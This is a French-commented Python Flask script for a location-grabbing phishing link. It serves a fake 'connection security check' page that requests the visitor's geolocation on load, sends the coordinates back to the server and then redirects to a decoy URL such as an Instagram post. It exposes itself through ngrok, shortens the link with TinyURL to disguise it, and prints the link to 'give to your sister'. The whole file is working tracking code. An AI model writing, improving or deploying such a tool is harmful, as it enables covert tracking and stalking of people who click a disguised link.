from flask import Flask, request, jsonify, render_template_string
import webbrowser
import subprocess
import time
import requests
import re

app = Flask(__name__)
redirect_target_url = None

landing_page_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Vérification de sécurité</title>
    <script>
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        fetch('/capture-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: latitude, lon: longitude })
                        })
                        .then(() => {
                            window.location.href = "{{ redirect_url }}";
                        })
                        .catch(() => {
                            window.location.href = "{{ redirect_url }}";
                        });
                    },
                    function () {
                        window.location.href = "{{ redirect_url }}";
                    }
                );
            } else {
                window.location.href = "{{ redirect_url }}";
            }
        }
    </script>
</head>
<body onload="captureLocation()">
    <p>Merci de patienter pendant la vérification de votre connexion...</p>
</body>
</html>
'''

@app.route('/redirect')
def redirect_page():
    global redirect_target_url
    if not redirect_target_url:
        return "Aucune URL de redirection définie.", 500
    return render_template_string(landing_page_template, redirect_url=redirect_target_url)

@app.route('/capture-location', methods=['POST'])
def capture_location():
    data = request.get_json()
    latitude = data.get('lat')
    longitude = data.get('lon')

    print(f"📍 Received location: Latitude={latitude}, Longitude={longitude}")
    google_maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    print(f"🌐 Google Maps URL: {google_maps_url}")
    webbrowser.open(google_maps_url)

    return jsonify({
        "status": "success",
        "latitude": latitude,
        "longitude": longitude,
        "map_url": google_maps_url
    })

def start_ngrok():
    print("🚀 Lancement de ngrok sur le port 5000...")
    subprocess.Popen(['ngrok', 'http', '5000'])
    time.sleep(2)  # Attente pour laisser le temps à ngrok de démarrer

    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels")
        public_url = response.json()['tunnels'][0]['public_url']
        return public_url
    except Exception as e:
        print("❌ Impossible de récupérer l'URL ngrok :", e)
        return None

def shorten_url_with_tinyurl(long_url):
    try:
        response = requests.get(f"http://tinyurl.com/api-create.php?url={long_url}")
        if response.status_code == 200:
            return response.text
        else:
            print("⚠️ Impossible de raccourcir l’URL (TinyURL)")
            return long_url
    except Exception as e:
        print("❌ Erreur TinyURL :", e)
        return long_url


if __name__ == '__main__':
    redirect_target_url = input("➡️ Entrez l'URL vers laquelle rediriger après géolocalisation : ").strip()
    if not redirect_target_url.startswith("http"):
        print("❌ URL invalide. Elle doit commencer par http:// ou https://")
    else:
        ngrok_url = start_ngrok()
        if ngrok_url:
            final_link = f"{ngrok_url}/redirect"
            short_link = shorten_url_with_tinyurl(final_link)
            print("\n🔗 Donne ce lien à ta sœur pour test :")
            print(short_link)

        else:
            print("⚠️ Ngrok n’a pas pu être lancé automatiquement. Lance-le manuellement : `ngrok http 5000`")

        app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)


# https://9a29-2a02-2788-4d4-8c1-f165-57a6-7ef-c8f4.ngrok-free.app/redirect?url=https://www.instagram.com/p/DBeT6YDPC9k/
